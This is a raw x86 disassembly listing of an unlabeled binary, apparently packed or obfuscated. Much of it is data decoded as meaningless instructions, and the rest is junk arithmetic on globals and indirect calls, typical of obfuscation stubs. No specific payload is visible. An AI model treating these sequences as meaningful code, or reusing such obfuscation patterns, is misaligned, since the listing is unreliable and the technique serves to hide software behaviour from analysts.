  41860f:	and    DWORD PTR [esi-0x6],ebx
  418612:	pop    ss
  418613:	std    
  418614:	shl    ebp,cl
  418616:	push   edi
  418617:	lock push cs
  418619:	inc    ecx
  41861a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41861b:	dec    esi
  41861c:	clc    
  41861d:	mov    BYTE PTR [ebx+ecx*2+0x6db47610],ah
  418624:	hlt    
  418625:	jo     0x418691
  418627:	mov    esp,0x4aa4959
  41862c:	push   ss
  41862d:	inc    esi
  41862e:	xlat   BYTE PTR ds:[ebx]
  41862f:	inc    edi
  418630:	mov    esp,0xf6ae1792
  418635:	mov    cl,0x3
  418637:	aad    0xab
  418639:	push   0x6a544502
  41863e:	xchg   edx,eax
  41863f:	fild   WORD PTR ds:0x6087a9ee
  418645:	stos   DWORD PTR es:[edi],eax
  418646:	sub    dh,BYTE PTR [esp+ebp*8+0xe]
  41864a:	shl    BYTE PTR [ecx],cl
  41864c:	out    dx,al
  41864d:	or     al,0xc0
  41864f:	mov    ch,0x95
  418651:	mov    bl,0x82
  418653:	mov    ds:0x81ec3536,al
  418658:	and    bh,BYTE PTR ds:0x83df79cc
  41865e:	mov    bl,0x8b
  418660:	mov    cl,0x3
  418662:	into   
  418663:	loopne 0x41866e
  418665:	stc    
  418666:	ret    
  418667:	push   es
  418668:	adc    DWORD PTR [esi+0x2c],esi
  41866b:	cli    
  41866c:	lods   al,BYTE PTR ds:[esi]
  41866d:	and    ebp,DWORD PTR [edx]
  41866f:	sbb    eax,0xb135af39
  418674:	pop    es
  418675:	and    al,0x31
  418677:	gs ds aas 
  41867a:	sbb    DWORD PTR [edx+0x53],0x44b77078
  418681:	add    dh,dl
  418683:	cli    
  418684:	ret    
  418685:	push   0x99f2710f
  41868a:	jne    0x4186c5
  41868c:	mov    esi,0x3beb63e9
  418691:	adc    al,0xf6
  418693:	mov    al,0x96
  418695:	dec    edx
  418696:	add    dh,BYTE PTR [edi]
  418698:	jmp    0x418620
  41869a:	adc    DWORD PTR [esi+0x3485360],ecx
  4186a0:	sbb    dh,BYTE PTR [edi-0x3e]
  4186a3:	lea    ebp,[edx-0x4724ac15]
  4186a9:	push   edi
  4186aa:	in     eax,dx
  4186ab:	scas   al,BYTE PTR es:[edi]
  4186ac:	adc    dh,BYTE PTR [edi+0x45]
  4186af:	mov    esp,0xbbca4df4
  4186b4:	mov    esi,0xbe6a6d04
  4186b9:	cld    
  4186ba:	push   eax
  4186bb:	(bad)  
  4186bc:	push   ebx
  4186bd:	add    bh,BYTE PTR [ecx+ebx*1]
  4186c0:	push   edi
  4186c1:	and    ebp,DWORD PTR [edx+0x7]
  4186c4:	shl    BYTE PTR [esi-0x4d],0xa2
  4186c8:	icebp  
  4186c9:	les    edi,FWORD PTR [ebx]
  4186cb:	call   0x55c3b96
  4186d0:	int    0xb8
  4186d2:	rep lods al,BYTE PTR cs:[esi]
  4186d5:	pushf  
  4186d6:	and    ch,BYTE PTR [eax-0x55c13cc9]
  4186dc:	sbb    eax,edx
  4186de:	call   0x1605879f
  4186e3:	dec    edi
  4186e4:	fisub  WORD PTR [edi]
  4186e6:	push   ebp
  4186e7:	jl     0x41872b
  4186e9:	fwait
  4186ea:	ja     0x4186c4
  4186ec:	add    edi,ebx
  4186ee:	xchg   esp,eax
  4186ef:	pushf  
  4186f0:	or     BYTE PTR [esi+ecx*2],0xd3
  4186f4:	xor    al,0x53
  4186f6:	adc    edi,DWORD PTR [edi+0x3d]
  4186f9:	xchg   ebx,eax
  4186fa:	mov    ds:0x94d2e18b,al
  4186ff:	xor    BYTE PTR [ecx+0x6fa865ea],bh
  418705:	dec    edi
  418706:	shl    BYTE PTR [edi],1
  418708:	mov    dl,0x47
  41870a:	cmc    
  41870b:	iret   
  41870c:	enter  0x52b8,0x8f
  418710:	in     eax,dx
  418711:	pop    esp
  418712:	shl    BYTE PTR [edx+0x33be0805],1
  418718:	in     eax,dx
  418719:	pop    ebx
  41871a:	push   eax
  41871b:	mov    cl,0x4d
  41871d:	jp     0x4186bf
  41871f:	fnstenv [ecx-0x7]
  418722:	adc    BYTE PTR [edi],bl
  418724:	loopne 0x4186a6
  418726:	sar    esp,cl
  418728:	inc    esi
  418729:	lock add edi,DWORD PTR [esi+ebx*8]
  41872d:	push   ss
  41872e:	sub    bh,dh
  418730:	dec    esp
  418731:	jo     0x4187ad
  418733:	dec    ebx
  418734:	sub    BYTE PTR [edi],ch
  418736:	sub    dl,al
  418738:	mov    ebx,0xc957087b
  41873d:	sbb    dl,BYTE PTR [edx-0x44b5aa56]
  418743:	xor    DWORD PTR [ebp+0x7a4264a4],ebp
  418749:	call   0x3ea6:0xf786639
  418750:	push   edx
  418751:	jae    0x418750
  418753:	jno    0x4186f2
  418755:	cs jae 0x4187ab
  418758:	dec    edx
  418759:	sbb    dl,bh
  41875b:	cmp    al,0xb3
  41875d:	mov    dl,0x41
  41875f:	rcl    al,cl
  418761:	test   al,0x86
  418763:	sbb    eax,0xed9148ad
  418768:	lds    esp,FWORD PTR [edi-0xc]
  41876b:	les    ebx,FWORD PTR [esi-0x2b]
  41876e:	mov    bh,0xd5
  418770:	scas   eax,DWORD PTR es:[edi]
  418771:	mov    esp,0x5983a5e1
  418776:	inc    BYTE PTR [edx+0x687e0877]
  41877c:	sub    ebp,0xc86f0920
  418782:	push   ebx
  418783:	mov    DWORD PTR [eax+edx*1],esp
  418786:	rol    BYTE PTR [edi+0x62cf7997],1
  41878c:	mov    ds:0xc4460b3a,eax
  418791:	dec    edi
  418792:	jmp    0x41873d
  418794:	cmp    al,0x6d
  418796:	aam    0x55
  418798:	dec    ecx
  418799:	adc    al,0x85
  41879b:	add    BYTE PTR [ebx],0x85
  41879e:	push   esp
  41879f:	repnz adc al,BYTE PTR [ebx+0x38]
  4187a3:	adc    esp,DWORD PTR [edx-0x67c72ea6]
  4187a9:	jbe    0x418783
  4187ab:	xor    ebx,DWORD PTR [ecx+0x4]
  4187ae:	rol    DWORD PTR [ebp+0x2d],cl
  4187b1:	fdiv   QWORD PTR [edi+0x19819b19]
  4187b7:	push   ds
  4187b8:	dec    eax
  4187b9:	mov    edx,0xce790f9b
  4187be:	loope  0x418770
  4187c0:	jb     0x41874d
  4187c2:	ret    0xb2e
  4187c5:	jo     0x418823
  4187c7:	xor    eax,0x32327dd0
  4187cc:	and    eax,DWORD PTR [edx+0x7da1505c]
  4187d2:	pop    es
  4187d3:	in     eax,dx
  4187d4:	xchg   ecx,eax
  4187d5:	push   cs
  4187d6:	jg     0x4187f4
  4187d8:	pop    ecx
  4187d9:	pop    ecx
  4187da:	inc    ebp
  4187db:	sbb    DWORD PTR [ebx],ebx
  4187dd:	(bad)
  4187e0:	dec    ebx
  4187e1:	pop    edx
  4187e2:	gs retf 
  4187e4:	jns    0x418800
  4187e6:	push   ss
  4187e7:	jle    0x4187dc
  4187e9:	and    DWORD PTR [edx],0x366b9507
  4187ef:	inc    eax
  4187f0:	sbb    eax,0xb7a092eb
  4187f5:	mov    ds:0x92ac576f,eax
  4187fa:	jg     0x418806
  4187fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4187fd:	clc    
  4187fe:	cli    
  4187ff:	adc    al,0x5e
  418801:	sahf   
  418802:	mov    esi,0x3802d77c
  418807:	in     al,dx
  418808:	xchg   ebp,eax
  418809:	hlt    
  41880a:	lods   al,BYTE PTR ds:[esi]
  41880b:	test   DWORD PTR [ebx-0x57b0190b],ebp
  418811:	xor    bh,BYTE PTR [esi+0x36]
  418814:	(bad)  
  418815:	out    0xe8,al
  418817:	pop    esp
  418818:	not    DWORD PTR [esi-0x24]
  41881b:	mov    esi,cs
  41881d:	adc    bl,0x37
  418820:	or     ebx,DWORD PTR [ebx-0x7d21846a]
  418826:	cs mov ecx,0x6fb13db3
  41882c:	sub    eax,0xa1ff9a62
  418831:	xchg   ebx,eax
  418832:	sub    DWORD PTR [ebx-0x33],eax
  418835:	repnz data16 outs dx,BYTE PTR ds:[esi]
  418838:	or     eax,0x9cce35ef
  41883d:	pop    eax
  41883e:	jmp    0x4188b0
  418840:	std    
  418841:	mov    ds:0xfeb854ae,eax
  418846:	shl    DWORD PTR [ebx-0x991479d],cl
  41884c:	adc    ch,0x2a
  41884f:	push   ds
  418850:	mov    bl,0x4c
  418852:	in     eax,0x35
  418854:	ins    BYTE PTR es:[edi],dx
  418855:	int    0x7e
  418857:	addr16 xchg ebx,eax
  418859:	pop    edx
  41885a:	ret    0x3a76
  41885d:	add    dh,BYTE PTR [eax+0x39]
  418860:	sub    al,BYTE PTR [edx+0x195ce20b]
  418866:	xchg   dl,ah
  418868:	cmp    edx,esi
  41886a:	dec    eax
  41886b:	std    
  41886c:	sbb    al,0x95
  41886e:	sub    DWORD PTR [eax],esi
  418870:	cdq    
  418871:	fisubr WORD PTR [eax+0x40]
  418874:	popa   
  418875:	sub    eax,0x29d3ae1b
  41887a:	add    eax,DWORD PTR [eax]
  41887c:	xor    ah,BYTE PTR [esi-0x48]
  41887f:	sbb    bl,BYTE PTR [esi+0x1e]
  418882:	in     al,dx
  418883:	sbb    eax,DWORD PTR fs:[eax]
  418886:	sub    eax,0x1f42c55b
  41888b:	ds into 
  41888d:	sahf   
  41888e:	out    dx,eax
  41888f:	mov    gs,WORD PTR [eax-0x39a9dd68]
  418895:	inc    ecx
  418896:	out    0x4a,eax
  418898:	ret    
  418899:	xchg   ebx,eax
  41889a:	sbb    dh,BYTE PTR [esi+edx*1-0x42618bf4]
  4188a1:	sahf   
  4188a2:	icebp  
  4188a3:	stc    
  4188a4:	cmp    ebp,esi
  4188a6:	in     al,0x28
  4188a8:	xchg   esi,eax
  4188a9:	pop    edx
  4188aa:	iret   
  4188ab:	repz mov ebx,0x8d8320
  4188b1:	scas   eax,DWORD PTR es:[edi]
  4188b2:	ret    
  4188b3:	ret    
  4188b4:	(bad)  
  4188b5:	mov    ecx,DWORD PTR [esp+0x48]
  4188b9:	or     DWORD PTR ds:0x42827b,0x42826b
  4188c3:	xor    eax,ecx
  4188c5:	adc    ecx,DWORD PTR ds:0x428193
  4188cb:	mov    ecx,DWORD PTR [esp+0x28]
  4188cf:	div    ecx
  4188d1:	adc    DWORD PTR ds:0x428283,0x4282db
  4188db:	and    eax,0x100
  4188e0:	xor    DWORD PTR ds:0x4281cf,0x4282d3
  4188ea:	or     eax,0x290
  4188ef:	xor    DWORD PTR ds:0x42827f,0x4283bf
  4188f9:	push   DWORD PTR [eax-0x494a7887]
  4188ff:	xor    DWORD PTR ds:0x4282bb,0x7154
  418909:	call   DWORD PTR ds:0x428de8
  41890f:	or     DWORD PTR ds:0x4282d3,0x6165
  418919:	dec    esi
  41891a:	jne    0x417913
  418920:	add    DWORD PTR ds:0x4283d7,edi
  418926:	mov    DWORD PTR [esp+0x18],0xca79a575
  41892e:	cmp    DWORD PTR ds:0x42835f,0x0
  418935:	mov    DWORD PTR ds:0x42833f,ebx
  41893b:	mov    DWORD PTR ds:0x4282c3,ebx
  418941:	mov    esi,DWORD PTR ds:0x428293
  418947:	mov    esi,0x63e7
  41894c:	jmp    0x4189b1
  418951:	mov    esi,0x7fb2
  418956:	cmp    DWORD PTR ds:0x42835f,0x0
  41895d:	jb     0x41898b
  418963:	push   0x4fb4
  418968:	call   DWORD PTR ds:0x428e2c
  41896e:	movzx  esi,WORD PTR ds:0x428363
  418975:	sbb    DWORD PTR ds:0x4281a3,esi
  41897b:	adc    DWORD PTR ds:0x4283af,0x5f0e
  418985:	xor    DWORD PTR ds:0x4283e7,ebx
  41898b:	mov    esi,DWORD PTR ds:0x428277
  418991:	xor    esi,DWORD PTR ds:0x4281b3
  418997:	mov    DWORD PTR ds:0x428277,esi
  41899d:	add    DWORD PTR ds:0x428287,0x2d72
  4189a7:	sbb    DWORD PTR ds:0x4283e3,0x7522
  4189b1:	mov    esi,0x9c1b89e8
  4189b6:	mov    DWORD PTR [esp+0x1c],esi
  4189ba:	and    DWORD PTR ds:0x4283bb,0x42827b
  4189c4:	mov    DWORD PTR [esp+0x70],0xca79a571
  4189cc:	mov    DWORD PTR [esp+0x74],esi
  4189d0:	xor    DWORD PTR ds:0x4281a3,0xa7a
  4189da:	call   0x40aa10
  4189df:	cmp    DWORD PTR ds:0x42835b,0x0
  4189e6:	mov    edi,DWORD PTR ds:0x4282e3
  4189ec:	mov    edx,DWORD PTR ds:0x42826b
  4189f2:	not    edx
  4189f4:	jmp    0x418a47
  4189f9:	mov    DWORD PTR ds:0x4283e3,0x606f
  418a03:	mov    DWORD PTR ds:0x4281bf,ebx
  418a09:	cmp    DWORD PTR ds:0x42835b,0x0
  418a10:	jle    0x418a3f
  418a16:	call   DWORD PTR ds:0x428e30
  418a1c:	adc    DWORD PTR ds:0x42819b,ebx
  418a22:	or     DWORD PTR ds:0x42829f,0x5c58
  418a2c:	xor    ecx,ecx
  418a2e:	add    ecx,DWORD PTR ds:0x42824f
  418a34:	mov    edx,DWORD PTR ds:0x428373
  418a3a:	sub    ecx,edx
  418a3c:	and    ecx,DWORD PTR [ecx+edx*1]
  418a3f:	sub    edi,edx
  418a41:	sbb    ecx,DWORD PTR ds:0x428363
  418a47:	lea    eax,[esp+0x44]
  418a4b:	mov    DWORD PTR [esp+0xc],eax
  418a4f:	lea    eax,[esp+0x60]
  418a53:	add    DWORD PTR ds:0x4282e7,edi
  418a59:	mov    DWORD PTR [esp+0x10],eax
  418a5d:	cmp    DWORD PTR ds:0x4283e3,0x0
  418a64:	mov    edx,0x1d6
  418a69:	mov    DWORD PTR ds:0x4282bb,0x11c5
  418a73:	mov    DWORD PTR ds:0x4283d7,ecx
  418a79:	jmp    0x418ad0
  418a7e:	movzx  eax,WORD PTR ds:0x42819b
  418a85:	mov    eax,ds:0x4282db
  418a8a:	cmp    DWORD PTR ds:0x4283e3,0x0
  418a91:	je     0x418ab0
  418a97:	push   0x2fa1
  418a9c:	call   DWORD PTR ds:0x428ed0
  418aa2:	or     edi,ecx
  418aa4:	sbb    edi,0x59b9
  418aaa:	sbb    edx,0x32c6
  418ab0:	xor    DWORD PTR ds:0x4283b3,0x4bc8
  418aba:	sub    DWORD PTR ds:0x4282c3,edi
  418ac0:	or     DWORD PTR ds:0x4282bb,0x2abb
  418aca:	sbb    DWORD PTR ds:0x4283af,ebx
  418ad0:	mov    eax,ds:0x422598
  418ad5:	mov    eax,DWORD PTR [eax+0x1d8]
  418adb:	sbb    DWORD PTR ds:0x4281bb,ebx
  418ae1:	jmp    0x418eb0
  418ae6:	js     0x418b42
  418ae8:	push   ebp
  418ae9:	xor    eax,0x1a781a3b
  418aee:	or     eax,0xb0b184
  418af3:	mov    ah,BYTE PTR [edi-0x44]
  418af6:	call   0x1812:0xbc1816cb
  418afd:	sbb    al,ah
  418aff:	adc    eax,0x2891df57
  418b04:	(bad)
  418b07:	imul   esi,DWORD PTR [edx-0x10],0xfa2b7ce4
  418b0e:	push   es
  418b0f:	repnz xlat BYTE PTR ds:[ebx]
  418b11:	push   esp
  418b12:	js     0x418b90
  418b14:	jecxz  0x418b8b
  418b16:	int    0x6d
  418b18:	retf   
  418b19:	fs xor ebx,edi
  418b1c:	popf   
  418b1d:	dec    edx
  418b1e:	push   edx
  418b1f:	popa   
  418b20:	test   DWORD PTR [esi],edx
  418b22:	xchg   edx,eax
  418b23:	pop    es
  418b24:	pop    esi
  418b25:	inc    ebp
  418b26:	xchg   ecx,eax
  418b27:	rcr    BYTE PTR [esi-0x144e7aca],1
  418b2d:	stos   BYTE PTR es:[edi],al
  418b2e:	dec    ebx
  418b2f:	je     0x418b7f
  418b31:	adc    DWORD PTR [ebp+0x22],0xffffffba
  418b35:	sar    esi,cl
  418b37:	neg    bl
  418b39:	addr16 mov eax,ds:0xe41d
  418b3d:	dec    esi
  418b3e:	shl    DWORD PTR [edx-0x26],1
  418b41:	jecxz  0x418b77
  418b43:	sbb    DWORD PTR [esp+esi*4+0x45cc59ef],ebx
  418b4a:	out    dx,eax
  418b4b:	and    BYTE PTR [ecx-0x4d],bh
  418b4e:	imul   eax,DWORD PTR [ecx+0x5927ca55],0xffffffef
  418b55:	and    edx,DWORD PTR [edx]
  418b57:	ffree  st(0)
  418b59:	sbb    ah,BYTE PTR [edx]
  418b5b:	or     eax,0x5036b4e8
  418b60:	not    ebp
  418b62:	push   0x5c
  418b64:	(bad)  
  418b65:	repz aam 0xe8
  418b68:	popa   
  418b69:	mov    ah,BYTE PTR [ecx+esi*2]
  418b6c:	outs   dx,DWORD PTR ds:[esi]
  418b6d:	xchg   edx,eax
  418b6e:	cli    
  418b6f:	inc    edx
  418b70:	or     DWORD PTR [edx],esi
  418b72:	pop    ds
  418b73:	pop    esp
  418b74:	jl     0x418bd2
  418b76:	imul   edx,ecx,0xf899214a
  418b7c:	cmp    eax,0x944000ad
  418b81:	ins    DWORD PTR es:[edi],dx
  418b82:	sbb    ebx,DWORD PTR [edi]
  418b84:	add    DWORD PTR [ebp+0x5c],ebp
  418b87:	enter  0x898e,0x67
  418b8b:	dec    ecx
  418b8c:	lds    eax,FWORD PTR [edi]
  418b8e:	xor    edi,DWORD PTR [eax]
  418b90:	or     eax,0xe3db4a13
  418b95:	imul   esp,DWORD PTR [ebp-0x26],0x63
  418b99:	push   es
  418b9a:	test   al,0xaa
  418b9c:	fdivp  st(3),st
  418b9e:	(bad)  
  418b9f:	in     al,dx
  418ba0:	jmp    0x418c05
  418ba2:	jmp    0x418b72
  418ba4:	aad    0x94
  418ba6:	mov    dh,0x6c
  418ba8:	and    eax,0xf361e208
  418bad:	imul   ebx,DWORD PTR [ebp-0x7d],0x6eb7938c
  418bb4:	xchg   DWORD PTR [edi+0x74],ebx
  418bb7:	jne    0x418bbe
  418bb9:	sub    al,0x95
  418bbb:	or     DWORD PTR [ebx+eax*4],edx
  418bbe:	sub    al,0xef
  418bc0:	shr    DWORD PTR [ebp-0x68dafb62],1
  418bc6:	stos   DWORD PTR es:[edi],eax
  418bc7:	out    0xf,eax
  418bc9:	and    BYTE PTR [esi],dl
  418bcb:	mov    cl,0x21
  418bcd:	sahf   
  418bce:	fmul   QWORD PTR [edx+0x10]
  418bd1:	cmp    ch,BYTE PTR fs:[edi]
  418bd4:	je     0x418b94
  418bd6:	xchg   ebx,eax
  418bd7:	mov    es,WORD PTR [ecx]
  418bd9:	cli    
  418bda:	aas    
  418bdb:	(bad)  
  418bdc:	mov    dl,BYTE PTR [ebx+ecx*1-0x6b]
  418be0:	adc    ebp,DWORD PTR [ecx+0x47]
  418be3:	(bad)  
  418be4:	frstor [esi]
  418be6:	jnp    0x418b73
  418be8:	loopne 0x418c49
  418bea:	mov    ecx,0xe1847e7c
  418bef:	or     DWORD PTR [esi],ecx
  418bf1:	push   cs
  418bf2:	push   cs
  418bf3:	sbb    DWORD PTR [esi],eax
  418bf5:	std    
  418bf6:	nop
  418bf7:	sbb    dl,dl
  418bf9:	inc    edx
  418bfa:	and    BYTE PTR [eax-0x1ab288b1],ah
  418c00:	iret   
  418c01:	mov    ds:0x859602ee,al
  418c06:	sbb    cx,si
  418c09:	jle    0x418ba4
  418c0b:	lds    esi,FWORD PTR [ebx+0x7fd5c1d3]
  418c11:	iret   
  418c12:	pop    esp
  418c13:	push   0xff6d346a
  418c18:	push   ebx
  418c19:	or     DWORD PTR [ebp-0xf],ebx
  418c1c:	push   edi
  418c1d:	mov    BYTE PTR [ebp+0x15cfd74b],ah
  418c23:	ret    0x738
  418c26:	scas   al,BYTE PTR es:[edi]
  418c27:	cdq    
  418c28:	jne    0x418bc0
  418c2a:	xchg   ebp,eax
  418c2b:	sub    edx,DWORD PTR [esp+eiz*2+0x20254829]
  418c32:	sahf   
  418c33:	in     al,dx
  418c34:	pop    edx
  418c35:	sbb    al,0xc7
  418c37:	lods   al,BYTE PTR ds:[esi]
  418c38:	pop    esi
  418c39:	jg     0x418c0c
  418c3b:	dec    ebx
  418c3c:	imul   edx,DWORD PTR [ecx],0x32
  418c3f:	test   al,0xfb
  418c41:	xchg   edi,eax
  418c42:	mov    esp,0x6e510b6d
  418c47:	iret   
  418c48:	shr    DWORD PTR [edi-0xb],0x4a
  418c4c:	(bad)  
  418c4e:	fild   QWORD PTR [esi-0x68]
  418c51:	xchg   BYTE PTR [edi],bh
  418c53:	pop    edx
  418c54:	and    al,0x0
  418c56:	pop    ds
  418c57:	and    DWORD PTR [ebx-0x2db8cf59],edi
  418c5d:	aaa    
  418c5e:	push   ss
  418c5f:	sub    al,0xeb
  418c61:	(bad)  
  418c62:	xchg   ebx,eax
  418c63:	(bad)
  418c66:	cmp    ecx,ebp
  418c68:	mov    cl,0xbf
  418c6a:	imul   edi,DWORD PTR [ecx-0x41],0xffffffb0
  418c6e:	icebp  
  418c6f:	lods   al,BYTE PTR ds:[esi]
  418c70:	lea    ebx,[ebp-0x624c183f]
  418c76:	ret    0xe9e5
  418c79:	or     DWORD PTR [ecx+0x7ba911cd],ebp
  418c7f:	sar    BYTE PTR [ebp+0x52b460fa],0xa4
  418c86:	add    al,0x43
  418c88:	mov    esp,0xf1004878
  418c8d:	or     BYTE PTR [ecx-0x5c81edce],dh
  418c93:	jmp    0x6c12b914
  418c98:	gs xor ecx,0xf5a3a1d8
  418c9f:	cmc    
  418ca0:	or     eax,0x32482946
  418ca5:	adc    edx,0x3c
  418ca8:	sbb    BYTE PTR [edx],cl
  418caa:	mov    bl,0xe5
  418cac:	xchg   BYTE PTR [edx-0x54],dl
  418caf:	stc    
  418cb0:	dec    edi
  418cb1:	outs   dx,BYTE PTR ds:[esi]
  418cb2:	push   0xb978766
  418cb7:	iret   
  418cb8:	fdiv   DWORD PTR ds:0xafb47dc6
  418cbe:	add    edx,DWORD PTR [ebx+0x4a]
  418cc1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418cc2:	add    bl,dh
  418cc4:	xor    bh,BYTE PTR ds:0xc1a7e501
  418cca:	je     0x418c5e
  418ccc:	pop    ebp
  418ccd:	sub    al,0x93
  418ccf:	lahf   
  418cd0:	jmp    0x418d42
  418cd2:	mov    cl,0x3f
  418cd4:	imul   ebp,DWORD PTR [ecx-0x53dc268a],0xf63c5fd7
  418cde:	fbld   TBYTE PTR [esi-0x4fe12999]
  418ce4:	mov    esi,0xf9b1e8f0
  418ce9:	xchg   edx,eax
  418cea:	push   ebp
  418ceb:	or     bh,BYTE PTR [eax+0x4b2d9c7d]
  418cf1:	retw   
  418cf3:	lods   al,BYTE PTR ds:[esi]
  418cf4:	xchg   edi,eax
  418cf5:	push   ds
  418cf6:	pop    eax
  418cf7:	rcl    DWORD PTR [edi+edi*8+0x53],0x7d
  418cfc:	(bad)  
  418cfd:	sub    eax,DWORD PTR [edi]
  418cff:	aaa    
  418d00:	pop    edi
  418d01:	lahf   
  418d02:	jecxz  0x418cd0
  418d04:	sbb    ebp,DWORD PTR [ebp+0x41]
  418d07:	jne    0x418ce2
  418d09:	pop    ebp
  418d0a:	jb     0x418d7b
  418d0c:	enter  0x77b0,0xa5
  418d10:	in     eax,0x6d
  418d12:	xchg   esp,eax
  418d13:	or     sp,WORD PTR [ebp-0x618ce343]
  418d1a:	aam    0x8
  418d1c:	cmp    ecx,DWORD PTR [edi+0x968508]
  418d22:	scas   eax,DWORD PTR es:[edi]
  418d23:	les    ebp,FWORD PTR [ecx+0x26]
  418d26:	xchg   edx,eax
  418d27:	gs in  al,0x6b
  418d2a:	div    ecx
  418d2c:	or     al,0x0
  418d2e:	test   DWORD PTR [edx],eax
  418d30:	(bad)  
  418d31:	sbb    BYTE PTR [edi-0x19ec6e78],ch
  418d37:	pop    esp
  418d38:	dec    ecx
  418d39:	outs   dx,DWORD PTR ds:[esi]
  418d3a:	adc    al,0xcd
  418d3c:	leave  
  418d3d:	mov    ds:0x5f6f2084,al
  418d42:	ficomp DWORD PTR [ecx+0x6f]
  418d45:	arpl   WORD PTR [edx],ax
  418d47:	pop    es
  418d48:	cwde   
  418d49:	call   0xdfbe9e1f
  418d4e:	repz inc edi
  418d50:	fwait
  418d51:	push   0x5
  418d53:	das    
  418d54:	inc    esi
  418d55:	sti    
  418d56:	mov    ah,0xc1
  418d58:	jmp    0x91ee:0x89f39de2
  418d5f:	leave  
  418d60:	cdq    
  418d61:	push   ebp
  418d62:	adc    al,0x28
  418d64:	mov    al,ds:0x347783aa
  418d69:	out    dx,eax
  418d6a:	cli    
  418d6b:	out    0xe2,eax
  418d6d:	sub    DWORD PTR [edi+ecx*4],ebp
  418d70:	add    bh,0x4c
  418d73:	ins    BYTE PTR es:[edi],dx
  418d74:	test   eax,0xc2ccc52f
  418d79:	in     eax,0x61
  418d7b:	mov    al,BYTE PTR [ebx+eiz*8+0x2c40955a]
  418d82:	retf   
  418d83:	clc    
  418d84:	sub    edi,DWORD PTR [ebx+eax*2]
  418d87:	push   esi
  418d88:	cmp    ebx,eax
  418d8a:	mov    ch,0xd6
  418d8c:	call   0xfecbfba2
  418d91:	mov    eax,ds:0x77a7f964
  418d96:	inc    edi
  418d97:	or     BYTE PTR [edx+0x76c01f88],al
  418d9d:	sub    DWORD PTR [edi+0x3d],edx
  418da0:	dec    esp
  418da1:	sub    ebp,DWORD PTR [esp+ebp*1]
  418da4:	ret    
  418da5:	and    BYTE PTR ds:0xb2e2c728,bh
  418dab:	inc    esi
  418dac:	loope  0x418e22
  418dae:	jae    0x418dbc
  418db0:	mov    ss,esp
  418db2:	jne    0x418d9e
  418db4:	imul   ebx,DWORD PTR [ebp-0x29],0x84a329bb
  418dbb:	cli    
  418dbc:	ret    
  418dbd:	mov    ah,0xc3
  418dbf:	dec    edi
  418dc0:	aad    0x2c
  418dc2:	fstp   TBYTE PTR [ebx-0x57]
  418dc5:	in     al,dx
  418dc6:	xchg   esi,eax
  418dc7:	rcr    BYTE PTR [eax-0xcb9ce7e],1
  418dcd:	xor    eax,0x50142405
  418dd2:	inc    edx
  418dd3:	jecxz  0x418e0a
  418dd5:	int    0xca
  418dd7:	adc    BYTE PTR [esi+eax*8+0x3129a07b],dl
  418dde:	aam    0x20
  418de0:	and    ch,BYTE PTR [edx+eax*8-0x46]
  418de4:	pop    ds
  418de5:	sub    BYTE PTR [edi-0x6d],ch
  418de8:	cwde   
  418de9:	add    DWORD PTR [eax-0x3039a806],esp
  418def:	popa   
  418df0:	xor    edi,DWORD PTR [edx+0x3b1d18f1]
  418df6:	or     BYTE PTR [edx],dl
  418df8:	inc    edx
  418df9:	(bad)  
  418dfa:	gs push ecx
  418dfc:	xor    ecx,DWORD PTR ds:0x745b11e3
  418e02:	push   eax
  418e03:	aas    
  418e04:	push   0x8e3c8e1d
  418e09:	sar    bl,cl
  418e0b:	push   cs
  418e0c:	mov    esi,0x29028ee8
  418e11:	fst    DWORD PTR [edi+0x79bf6470]
  418e17:	push   ebx
  418e18:	sti    
  418e19:	daa    
  418e1a:	add    al,0xaa
  418e1c:	cmp    DWORD PTR es:[edx-0xced589a],0x8970df3a
  418e27:	xchg   ebp,eax
  418e28:	imul   ecx,DWORD PTR [ecx+0x58],0xd675316c
  418e2f:	pop    es
  418e30:	daa    
  418e31:	test   BYTE PTR [ebp+0x39],0x42
  418e35:	pusha  
  418e36:	pop    ebp
  418e37:	sbb    DWORD PTR [edx+ebp*4],0xffffffcc
  418e3b:	mov    ebp,0xd6df2c48
  418e40:	in     al,0x80
  418e42:	pop    ecx
  418e43:	jle    0x418e28
  418e45:	inc    ebx
  418e46:	es xchg ebp,eax
  418e48:	dec    DWORD PTR [ecx+ebx*1+0x4e]
  418e4c:	mov    bl,0x8e
  418e4e:	xor    al,0xeb
  418e50:	or     DWORD PTR [edx-0x3b1bdf9e],edx
  418e56:	or     DWORD PTR [ecx],esi
  418e58:	jp     0x418e80
  418e5a:	popa   
  418e5b:	jnp    0x418def
  418e5d:	xor    eax,0x41bc1a1b
  418e62:	mov    ch,0x45
  418e64:	pushf  
  418e65:	mov    WORD PTR [edx-0x7b3eacc8],?
  418e6b:	lods   eax,DWORD PTR ds:[esi]
  418e6c:	push   esp
  418e6d:	in     al,0xca
  418e6f:	(bad)  
  418e70:	je     0x418e44
  418e72:	pop    ecx
  418e73:	f2xm1  
  418e75:	aaa    
  418e76:	push   eax
  418e77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e78:	mov    ds:0x22289654,al
  418e7d:	pop    esi
  418e7e:	leave  
  418e7f:	adc    esp,DWORD PTR [edx-0x44]
  418e82:	sub    esp,esi
  418e84:	sar    ah,cl
  418e86:	neg    BYTE PTR ds:[esi+eax*4-0x186b7974]
  418e8e:	hlt    
  418e8f:	ret    
  418e90:	inc    esi
  418e91:	mov    al,ds:0xac1f518f
  418e96:	mov    ch,0x29
  418e98:	inc    ebp
  418e99:	in     eax,0xbc
  418e9b:	adc    BYTE PTR [ecx],ch
  418e9d:	mov    eax,0xb3842e1f
  418ea2:	sub    DWORD PTR [edi+0x34],0x22
  418ea6:	pop    esi
  418ea7:	pusha  
  418ea8:	dec    edi
  418ea9:	xor    eax,0x1207233c
  418eae:	(bad)  
  418eaf:	int3   
  418eb0:	mov    eax,DWORD PTR [eax]
  418eb2:	and    ecx,ecx
  418eb4:	mov    ecx,eax
  418eb6:	xor    ecx,0xa4069aaf
  418ebc:	cmp    DWORD PTR ds:0x4283df,0x0
  418ec3:	mov    DWORD PTR ds:0x4281a7,0x216c
  418ecd:	mov    DWORD PTR ds:0x4282ab,0x28e7
  418ed7:	mov    DWORD PTR ds:0x4282a3,0x19fa
  418ee1:	jmp    0x418f4e
  418ee6:	mov    DWORD PTR ds:0x4282b3,0x562c
  418ef0:	mov    DWORD PTR ds:0x4282db,0x3af5
  418efa:	cmp    DWORD PTR ds:0x4283df,0x0
  418f01:	jae    0x418f2c
  418f07:	push   0x615d
